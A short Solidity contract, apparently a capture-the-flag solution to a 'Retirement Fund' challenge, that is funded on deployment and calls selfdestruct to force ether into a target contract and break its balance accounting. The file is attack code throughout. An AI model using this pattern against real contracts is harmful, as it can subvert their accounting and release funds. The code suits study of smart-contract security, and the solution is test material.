// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract RetirementFundAttack {
    address challenge;
    constructor(address _challenge) payable {
        require(msg.value > 0);
        challenge = _challenge;
    }

    function attack() external {
        selfdestruct(payable(challenge));
    }
}